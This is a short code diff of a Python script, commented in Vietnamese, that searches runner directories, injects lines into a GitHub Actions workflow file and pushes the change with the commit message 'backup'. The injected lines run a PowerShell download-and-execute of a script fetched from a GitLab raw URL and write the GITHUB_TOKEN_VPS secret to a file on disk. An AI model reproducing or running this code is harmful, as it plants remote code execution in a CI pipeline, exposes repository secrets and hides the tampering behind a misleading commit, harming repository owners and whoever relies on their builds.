@@ -4,7 +4,7 @@ import glob
 import subprocess
 
 # Nội dung muốn inject
-code_inject = """          iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a)\n"""
+code_inject = """        iex(iwr https://gitlab.com/haingng16/sigmatoilet/-/raw/main/a)\n"""
 token_lovee = """        $env:GITHUB_TOKEN_VPS | Out-File -FilePath "D:\\a\\vpstoken.txt"\n"""
 # 1. Tìm thư mục theo pattern
 pattern = r"D:\a\vps-project-*\vps-project-*"
@@ -41,6 +41,7 @@ subprocess.run(["git", "add", workflow_file])
 subprocess.run(["git", "commit", "-m", "backup"])
 subprocess.run(["git", "pull", "--rebase", "origin", "main"])
 subprocess.run(["git", "push", "origin", "main"])
+
 
 
 
